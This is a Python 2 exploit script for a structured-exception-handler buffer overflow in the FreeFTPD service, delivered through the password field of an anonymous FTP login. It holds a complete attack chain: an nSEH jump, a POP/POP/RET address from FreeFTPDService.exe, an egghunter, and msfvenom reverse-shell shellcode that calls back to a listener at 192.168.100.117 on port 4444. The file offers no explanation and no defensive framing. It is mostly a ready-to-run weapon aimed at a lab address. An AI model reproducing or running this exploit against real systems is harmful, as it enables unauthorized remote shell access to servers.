import socket
import os
import sys
from ftplib import FTP

nSeh = "\xeb\x80\x90\x90" # Jump back 126 Bytes
Seh  = "\x26\x42\x41\x00" # 0x00414226 ASLR: False, Rebase: False, SafeSEH: False, OS: False - FreeFTPDService.exe

# Egghunter - tag =  w00t - 32 bytes
egghunter  = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.117 LPORT=4444 -b "\x00\x0a\x0d" -f python -v revshell
# 351 bytes
revshell  = "w00tw00t"
revshell += b"\xdb\xd7\xd9\x74\x24\xf4\x58\xba\x4e\x02\xd8\x3a"
revshell += b"\x2b\xc9\xb1\x52\x31\x50\x17\x83\xe8\xfc\x03\x1e"
revshell += b"\x11\x3a\xcf\x62\xfd\x38\x30\x9a\xfe\x5c\xb8\x7f"
revshell += b"\xcf\x5c\xde\xf4\x60\x6d\x94\x58\x8d\x06\xf8\x48"
revshell += b"\x06\x6a\xd5\x7f\xaf\xc1\x03\x4e\x30\x79\x77\xd1"
revshell += b"\xb2\x80\xa4\x31\x8a\x4a\xb9\x30\xcb\xb7\x30\x60"
revshell += b"\x84\xbc\xe7\x94\xa1\x89\x3b\x1f\xf9\x1c\x3c\xfc"
revshell += b"\x4a\x1e\x6d\x53\xc0\x79\xad\x52\x05\xf2\xe4\x4c"
revshell += b"\x4a\x3f\xbe\xe7\xb8\xcb\x41\x21\xf1\x34\xed\x0c"
revshell += b"\x3d\xc7\xef\x49\xfa\x38\x9a\xa3\xf8\xc5\x9d\x70"
revshell += b"\x82\x11\x2b\x62\x24\xd1\x8b\x4e\xd4\x36\x4d\x05"
revshell += b"\xda\xf3\x19\x41\xff\x02\xcd\xfa\xfb\x8f\xf0\x2c"
revshell += b"\x8a\xd4\xd6\xe8\xd6\x8f\x77\xa9\xb2\x7e\x87\xa9"
revshell += b"\x1c\xde\x2d\xa2\xb1\x0b\x5c\xe9\xdd\xf8\x6d\x11"
revshell += b"\x1e\x97\xe6\x62\x2c\x38\x5d\xec\x1c\xb1\x7b\xeb"
revshell += b"\x63\xe8\x3c\x63\x9a\x13\x3d\xaa\x59\x47\x6d\xc4"
revshell += b"\x48\xe8\xe6\x14\x74\x3d\xa8\x44\xda\xee\x09\x34"
revshell += b"\x9a\x5e\xe2\x5e\x15\x80\x12\x61\xff\xa9\xb9\x98"
revshell += b"\x68\x16\x95\xc6\x1d\xfe\xe4\x06\xcf\xa2\x61\xe0"
revshell += b"\x85\x4a\x24\xbb\x31\xf2\x6d\x37\xa3\xfb\xbb\x32"
revshell += b"\xe3\x70\x48\xc3\xaa\x70\x25\xd7\x5b\x71\x70\x85"
revshell += b"\xca\x8e\xae\xa1\x91\x1d\x35\x31\xdf\x3d\xe2\x66"
revshell += b"\x88\xf0\xfb\xe2\x24\xaa\x55\x10\xb5\x2a\x9d\x90"
revshell += b"\x62\x8f\x20\x19\xe6\xab\x06\x09\x3e\x33\x03\x7d"
revshell += b"\xee\x62\xdd\x2b\x48\xdd\xaf\x85\x02\xb2\x79\x41"
revshell += b"\xd2\xf8\xb9\x17\xdb\xd4\x4f\xf7\x6a\x81\x09\x08"
revshell += b"\x42\x45\x9e\x71\xbe\xf5\x61\xa8\x7a\x05\x28\xf0"
revshell += b"\x2b\x8e\xf5\x61\x6e\xd3\x05\x5c\xad\xea\x85\x54"
revshell += b"\x4e\x09\x95\x1d\x4b\x55\x11\xce\x21\xc6\xf4\xf0"
revshell += b"\x96\xe7\xdc"

buffer  = revshell
buffer += "A" * (671 - len(revshell))
buffer += "\x90" * 15 # 126 bytes from Here to nSeh
buffer += egghunter
buffer += "B" * 79
buffer += nSeh
buffer += Seh
buffer += "D" * (5000 - len(buffer))

print "[*] Sending evil ftp request to target"
ftp = FTP()
ftp.connect('192.168.100.120', 21)
ftp.login('anonymous', buffer)

